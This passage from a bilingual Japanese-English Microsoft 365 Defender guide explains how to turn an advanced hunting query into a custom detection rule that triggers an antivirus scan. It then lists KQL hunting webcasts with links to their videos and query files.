<span data-ttu-id="7e270-342">カスタム検出は、設定した頻度に従ってクエリを実行し、クエリの結果によって、選択した影響を受ける影響を受けたリソースに基づいてセキュリティ警告が作成されます。</span><span class="sxs-lookup"><span data-stu-id="7e270-342">Custom detections will run the query according to the frequency you set, and the results of the queries will create security alerts, based on the impacted assets you choose.</span></span> <span data-ttu-id="7e270-343">これらのアラートは、インシデントに関連付けられ、いずれかの製品によって生成された他のセキュリティ警告としてトリアージできます。</span><span class="sxs-lookup"><span data-stu-id="7e270-343">Those alerts will be correlated to incidents and can be triaged as any other security alert generated by one of the products.</span></span>

1.  <span data-ttu-id="7e270-344">[クエリ] ページで、「検索」の手順7で追加した7行と8行を削除し、[ **検出ルールの作成** ] をクリックします。</span><span class="sxs-lookup"><span data-stu-id="7e270-344">On the query page, remove lines 7 and 8 that were added in step 7 of the Go hunting instructions and click **Create detection rule**.</span></span> 
    
    ![高度な検索ページの [検出ルールの作成] をクリックできる場所のスクリーンショット](../../media/mtp/fig22.png) 

    > [!NOTE]
    > <span data-ttu-id="7e270-346">[ **検出ルールの作成** ] をクリックした場合、クエリに構文エラーがあると、検出ルールは保存されません。</span><span class="sxs-lookup"><span data-stu-id="7e270-346">If you click **Create detection rule** and you have syntax errors in your query, your detection rule won’t be saved.</span></span> <span data-ttu-id="7e270-347">クエリをもう一度確認して、エラーがないことを確認してください。</span><span class="sxs-lookup"><span data-stu-id="7e270-347">Double-check your query to ensure there’s no errors.</span></span> 


2.  <span data-ttu-id="7e270-348">必要なフィールドに情報を入力して、セキュリティチームが警告を理解できるようにし、生成された理由と、実行する必要のあるアクションについて説明します。</span><span class="sxs-lookup"><span data-stu-id="7e270-348">Fill in the required fields with the  information that will allow the security team to understand the alert, why it was generated, and what actions you expect them to take.</span></span> 

    ![アラートの詳細を定義できる [検出ルールの作成] ページのスクリーンショット](../../media/mtp/fig23.png)

    <span data-ttu-id="7e270-350">この検出ルールのアラートについて次のユーザーに情報を提供できるように、わかりやすいようにフィールドに記入してください。</span><span class="sxs-lookup"><span data-stu-id="7e270-350">Ensure that you fill out the fields with clarity to help give the next user an informed decision about this detection rule alert</span></span> 

3.  <span data-ttu-id="7e270-351">この通知で影響を受けるエンティティを選択します。</span><span class="sxs-lookup"><span data-stu-id="7e270-351">Select what entities are impacted in this alert.</span></span> <span data-ttu-id="7e270-352">この場合は、[ **デバイス** と **メールボックス** ] を選択します。</span><span class="sxs-lookup"><span data-stu-id="7e270-352">In this case, select **Device** and **Mailbox**.</span></span>

    ![影響を受けるエンティティのパラメータを選択できる [検出ルールの作成] ページのスクリーンショット](../../media/mtp/fig24.png)
 

4.  <span data-ttu-id="7e270-354">アラートがトリガーされた場合に実行するアクションを決定します。</span><span class="sxs-lookup"><span data-stu-id="7e270-354">Determine what actions should take place if the alert is triggered.</span></span> <span data-ttu-id="7e270-355">この場合は、ウイルス対策スキャンを実行します。ただし、他のアクションを実行することができます。</span><span class="sxs-lookup"><span data-stu-id="7e270-355">In this case, run an antivirus scan, though other actions could be taken.</span></span> 

    ![脅威に対処するためにアラートがトリガーされたときにウイルス対策スキャンを実行できる [検出ルールの作成] ページのスクリーンショット](../../media/mtp/fig25.png) 

5.  <span data-ttu-id="7e270-357">通知ルールの範囲を選択します。</span><span class="sxs-lookup"><span data-stu-id="7e270-357">Select the scope for the alert rule.</span></span> <span data-ttu-id="7e270-358">このクエリはデバイスに関係しているため、このカスタム検出ではエンドポイントコンテキストの Microsoft Defender に従ってデバイスグループが関連しています。</span><span class="sxs-lookup"><span data-stu-id="7e270-358">Since this query involve devices, the device groups are relevant in this custom detection according to Microsoft Defender for Endpoint context.</span></span> <span data-ttu-id="7e270-359">影響を受けるエンティティとしてデバイスを含まないカスタム検出を作成する場合、範囲は適用されません。</span><span class="sxs-lookup"><span data-stu-id="7e270-359">When creating a custom detection that does not include devices as impacted entities, scope does not apply.</span></span>  

    ![通知ルールのスコープを設定できる [検出ルールの作成] ページのスクリーンショットに表示される結果に対する期待を管理する](../../media/mtp/fig26.png) 

    <span data-ttu-id="7e270-361">このようなパイロットについては、運用環境のテストデバイスのサブセットに制限することをお勧めします。</span><span class="sxs-lookup"><span data-stu-id="7e270-361">For this pilot, you might want to limit this rule to a subset of testing devices in your production environment.</span></span>

6.  <span data-ttu-id="7e270-362">**[作成]** を選択します。</span><span class="sxs-lookup"><span data-stu-id="7e270-362">Select **Create**.</span></span> <span data-ttu-id="7e270-363">次に、ナビゲーションパネルから [ **カスタム検出ルール** ] を選択します。</span><span class="sxs-lookup"><span data-stu-id="7e270-363">Then, select **Custom detection rules** from the navigation panel.</span></span>
 
    ![メニューの [カスタム検出ルール] オプションのスクリーンショット](../../media/mtp/fig27a.png) 

    ![ルールと実行の詳細を表示する [検出ルール] ページのスクリーンショット](../../media/mtp/fig27b.png) 

<span data-ttu-id="7e270-366">このページでは、検出ルールを選択して、詳細ページを開くことができます。</span><span class="sxs-lookup"><span data-stu-id="7e270-366">From this page, you can select the detection rule, which will open a details page.</span></span> 

    ![Screenshot of the email attachments page where you can see the status of the rule execution, triggered alerts and actions, edit the detection, and so on](../../media/mtp/fig28.png) 

### <a name="additional-advanced-hunting-walk-through-exercises"></a><span data-ttu-id="7e270-367">その他の高度な検索ウォークスルー演習</span><span class="sxs-lookup"><span data-stu-id="7e270-367">Additional advanced hunting walk-through exercises</span></span>

<span data-ttu-id="7e270-368">高度な検索の詳細については、次の web キャストを参照してください。 Microsoft 365 Defender での高度な検索機能を使用して、クロス柱のクエリを作成し、エンティティにピボットし、カスタムの検出と修復アクションを作成します。</span><span class="sxs-lookup"><span data-stu-id="7e270-368">To learn more about advanced hunting, the following webcasts will walk you through the capabilities of advanced hunting within Microsoft 365 Defender to create cross-pillar queries, pivot to entities and create custom detections and remediation actions.</span></span>

>[!NOTE]
><span data-ttu-id="7e270-369">パイロットテストラボ環境で検索クエリを実行するには、独自の GitHub アカウントを用意してください。</span><span class="sxs-lookup"><span data-stu-id="7e270-369">Be prepared with your own GitHub account to run the hunting queries in your pilot test lab environment.</span></span>  

|  <span data-ttu-id="7e270-370">Title</span><span class="sxs-lookup"><span data-stu-id="7e270-370">Title</span></span>  |  <span data-ttu-id="7e270-371">説明</span><span class="sxs-lookup"><span data-stu-id="7e270-371">Description</span></span>  |  <span data-ttu-id="7e270-372">MP4 のダウンロード</span><span class="sxs-lookup"><span data-stu-id="7e270-372">Download MP4</span></span>  |  <span data-ttu-id="7e270-373">YouTube の鑑賞</span><span class="sxs-lookup"><span data-stu-id="7e270-373">Watch on YouTube</span></span>  |  <span data-ttu-id="7e270-374">使用する CSL ファイル</span><span class="sxs-lookup"><span data-stu-id="7e270-374">CSL file to use</span></span>  |
|:-----|:-----|:-----|:-----|:-----|
| <span data-ttu-id="7e270-375">エピソード 1: KQL の基礎</span><span class="sxs-lookup"><span data-stu-id="7e270-375">Episode 1: KQL fundamentals</span></span> | <span data-ttu-id="7e270-376">Microsoft 365 Defender の高度な検索機能の基本事項について説明します。</span><span class="sxs-lookup"><span data-stu-id="7e270-376">We’ll cover the basics of advanced hunting capabilities in Microsoft 365 Defender.</span></span> <span data-ttu-id="7e270-377">使用できる高度な検索データと基本的な KQL 構文および演算子について説明します。</span><span class="sxs-lookup"><span data-stu-id="7e270-377">Learn about available advanced hunting data and basic KQL syntax and operators.</span></span> | [<span data-ttu-id="7e270-378"> MP4</span><span class="sxs-lookup"><span data-stu-id="7e270-378"> MP4</span></span>](https://aka.ms/MTP15JUL20_MP4) | [<span data-ttu-id="7e270-379">YouTube</span><span class="sxs-lookup"><span data-stu-id="7e270-379">YouTube</span></span>](https://youtu.be/0D9TkGjeJwM) | [<span data-ttu-id="7e270-380">エピソード 1: Git の CSL ファイル</span><span class="sxs-lookup"><span data-stu-id="7e270-380">Episode 1: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl) |
| <span data-ttu-id="7e270-381">エピソード 2: 結合</span><span class="sxs-lookup"><span data-stu-id="7e270-381">Episode 2: Joins</span></span> | <span data-ttu-id="7e270-382">高度な検索でデータについて学習を続け、テーブルを結合する方法について説明します。</span><span class="sxs-lookup"><span data-stu-id="7e270-382">We’ll continue learning about data in advanced hunting and how to join tables together.</span></span> <span data-ttu-id="7e270-383">インナー、outer、unique、および半結合、および既定の Kusto innerunique join のニュアンスについて説明します。</span><span class="sxs-lookup"><span data-stu-id="7e270-383">Learn about inner, outer, unique, and semi joins, and the nuances of the default Kusto innerunique join.</span></span> | [<span data-ttu-id="7e270-384">MP4</span><span class="sxs-lookup"><span data-stu-id="7e270-384">MP4</span></span>](https://aka.ms/MTP22JUL20_MP4) | [<span data-ttu-id="7e270-385">YouTube</span><span class="sxs-lookup"><span data-stu-id="7e270-385">YouTube</span></span>](https://youtu.be/LMrO6K5TWOU) | [<span data-ttu-id="7e270-386">エピソード 2: Git の CSL ファイル</span><span class="sxs-lookup"><span data-stu-id="7e270-386">Episode 2: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl) |
| <span data-ttu-id="7e270-387">エピソード 3: データの集約、ピボット、および視覚化</span><span class="sxs-lookup"><span data-stu-id="7e270-387">Episode 3: Summarizing, pivoting, and visualizing data</span></span>|<span data-ttu-id="7e270-388">これで、データのフィルター処理、操作、および結合を行うことができるようになり、集約、定量化、ピボット、可視化を開始する時間になります。</span><span class="sxs-lookup"><span data-stu-id="7e270-388">Now that we’re able to filter, manipulate, and join data, it’s time to start summarizing, quantifying, pivoting, and visualizing.</span></span> <span data-ttu-id="7e270-389">このエピソードでは、高度な検索スキーマで追加のテーブルを準備する際に実行できる集計演算子と計算のいくつかについて説明します。</span><span class="sxs-lookup"><span data-stu-id="7e270-389">In this episode, we’ll cover the summarize operator and some of the calculations you can perform while diving into additional tables in the advanced hunting schema.</span></span> <span data-ttu-id="7e270-390">分析を向上させるために、データセットをグラフに変換します。</span><span class="sxs-lookup"><span data-stu-id="7e270-390">We turn our datasets into charts that can help improve analysis.</span></span> | [<span data-ttu-id="7e270-391">MP4</span><span class="sxs-lookup"><span data-stu-id="7e270-391">MP4</span></span>](https://aka.ms/MTP29JUL20_MP4) | [<span data-ttu-id="7e270-392">YouTube</span><span class="sxs-lookup"><span data-stu-id="7e270-392">YouTube</span></span>](https://youtu.be/UKnk9U1NH6Y) | [<span data-ttu-id="7e270-393">エピソード 3: Git の CSL ファイル</span><span class="sxs-lookup"><span data-stu-id="7e270-393">Episode 3: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl) |
| <span data-ttu-id="7e270-394">エピソード 4: ご利用いただけます。</span><span class="sxs-lookup"><span data-stu-id="7e270-394">Episode 4: Let’s hunt!</span></span> <span data-ttu-id="7e270-395">KQL をインシデント追跡に適用する</span><span class="sxs-lookup"><span data-stu-id="7e270-395">Applying KQL to incident tracking</span></span>|<span data-ttu-id="7e270-396">攻撃者の活動を追跡する時間。</span><span class="sxs-lookup"><span data-stu-id="7e270-396">Time to track some attacker activity!</span></span> <span data-ttu-id="7e270-397">このエピソードでは、Microsoft 365 Defender での KQL および advanced の高度な検索について強化されたことを使用して、攻撃を追跡します。</span><span class="sxs-lookup"><span data-stu-id="7e270-397">In this episode, we’ll use our improved understanding of KQL and advanced hunting in Microsoft 365 Defender to track an attack.</span></span> <span data-ttu-id="7e270-398">Cybersecurity の ABCs やインシデントへの対応に適用する方法など、攻撃者のアクティビティを追跡するためにフィールドで使用されるヒントのいくつかについて説明します。</span><span class="sxs-lookup"><span data-stu-id="7e270-398">Learn some of the tips and tricks used in the field to track attacker activity, including the ABCs of cybersecurity and how to apply them to incident response.</span></span> | [<span data-ttu-id="7e270-399">MP4</span><span class="sxs-lookup"><span data-stu-id="7e270-399">MP4</span></span>](https://aka.ms/MTP5AUG20_MP4) | [<span data-ttu-id="7e270-400">YouTube</span><span class="sxs-lookup"><span data-stu-id="7e270-400">YouTube</span></span>](https://youtu.be/2EUxOc_LNd8) | [<span data-ttu-id="7e270-401">エピソード 4: Git の CSL ファイル</span><span class="sxs-lookup"><span data-stu-id="7e270-401">Episode 4: CSL file in Git</span></span>](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl) |

## <a name="next-step"></a><span data-ttu-id="7e270-402">次のステップ</span><span class="sxs-lookup"><span data-stu-id="7e270-402">Next step</span></span>
|<span data-ttu-id="7e270-403">![決算および概要フェーズ](../../media/mtp/close.png)</span><span class="sxs-lookup"><span data-stu-id="7e270-403">![Closing and summary phase](../../media/mtp/close.png)</span></span> <br>[<span data-ttu-id="7e270-404">決算および概要フェーズ</span><span class="sxs-lookup"><span data-stu-id="7e270-404">Closing and summary phase</span></span>](mtp-pilot-close.md) | <span data-ttu-id="7e270-405">Microsoft 365 Defender パイロットの結果を分析し、ステークホルダーに提示して、次の手順を実行します。</span><span class="sxs-lookup"><span data-stu-id="7e270-405">Analyze your Microsoft 365 Defender pilot outcome, present them to your stakeholders, and take the next step.</span></span>
|:-----|:-----|

